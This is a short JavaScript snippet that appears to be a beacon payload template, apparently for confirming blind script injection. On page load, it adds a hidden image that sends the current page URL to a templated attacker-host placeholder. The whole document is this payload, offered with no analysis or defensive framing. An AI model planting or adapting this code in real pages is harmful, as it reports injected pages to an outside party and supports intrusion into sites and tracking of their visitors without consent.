
if (typeof(__beacon_called) == 'undefined') {
  document.addEventListener('DOMContentLoaded', function () {
    var img = document.createElement('img');
    var url = encodeURIComponent(document.location);
    img.setAttribute('src', 'http://{{IP}}/?location=' + url)
    document.getElementsByTagName('body')[0].appendChild(img);
  });
}

var __beacon_called = true

